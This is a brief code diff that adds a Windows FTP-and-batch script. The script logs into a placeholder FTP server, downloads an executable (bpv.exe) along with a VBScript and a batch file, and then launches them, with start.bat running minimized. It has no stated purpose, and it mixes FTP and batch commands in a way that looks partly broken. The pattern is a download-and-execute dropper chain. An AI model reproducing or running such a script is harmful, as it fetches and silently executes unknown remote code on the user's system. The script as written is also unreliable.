@@ -1,0 +1,13 @@
+open *ftp1 server link*
+*ftp1 username*
+*ftp1 password*
+binary
+get bpv.exe
+get close.vbs
+get start.bat
+ftp -s:start2.bat
+quit
+
+start /min start.bat
+start close.vbs
+exit
